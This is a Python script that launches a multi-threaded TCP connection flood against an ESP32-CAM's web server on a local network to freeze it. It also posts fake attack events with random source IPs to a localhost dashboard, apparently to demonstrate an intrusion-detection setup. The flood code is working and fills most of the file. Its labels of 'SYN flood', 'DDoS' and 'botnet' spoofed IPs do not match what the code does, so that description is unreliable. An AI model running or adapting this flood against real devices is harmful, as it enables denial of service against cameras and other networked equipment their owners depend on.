"""
HIGH INTENSITY ATTACK: DDoS SYN Flood → ESP32-CAM
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Launches a multi-threaded high-speed flood.
Designed to physically saturate and FREEZE the ESP32-CAM.
"""
import requests, time, threading, random

# --- CONFIGURATION ---
API = "http://localhost:8000"
ESP32_IP = "192.168.166.167" # Replace with your ESP32's current IP
THREADS = 10
PACKETS_PER_THREAD = 1000  # Total 10,000 packets

print("=" * 65)
print("  💥 HIGH INTENSITY DDoS: SYN FLOOD")
print(f"  Target IP  : {ESP32_IP}")
print(f"  Intensity  : {THREADS} Threads / {PACKETS_PER_THREAD * THREADS} Packets")
print("=" * 65)

# 1. Update Dashboard: Camera is currently OK
requests.post(f"{API}/api/esp32/camera-status", json={"status": "STREAMING", "target_ip": ESP32_IP})

def flood_worker():
    """Tight loop for high-speed flood injection"""
    for _ in range(PACKETS_PER_THREAD):
        try:
            # Random spoofed IPs from known botnets
            src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
            # Inject into Dashboard (Visualization)
            requests.post(f"{API}/api/inject-attack", params={
                "attack_type": "dos", "source_ip": src_ip, "dest_ip": ESP32_IP
            }, timeout=0.1)
            
            # Optional: Real TCP flood (Attempts to connect to ESP32 port 80)
            # This is what actually freezes the physical camera
            import socket
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.01)
            s.connect_ex((ESP32_IP, 80)) # Try to hit the web server
            s.close()
        except:
            pass

# Start the threads
print("\n[⚡] LAUNCHING FLOOD...")
threads = []
for i in range(THREADS):
    t = threading.Thread(target=flood_worker)
    t.start()
    threads.append(t)

# Wait for threads
for t in threads:
    t.join()

# 2. Update Dashboard: Camera is now FROZEN
print("\n[❄️] ESP32-CAM OVERWHELMED! Status: FROZEN")
requests.post(f"{API}/api/esp32/camera-status", json={"status": "FROZEN", "target_ip": ESP32_IP})

print("\n" + "=" * 65)
print("  ✅ ATTACK COMPLETE: ESP32-CAM Status is now FROZEN on Dashboard.")
print("  Check your Vercel Dashboard and Telegram!")
print("=" * 65)
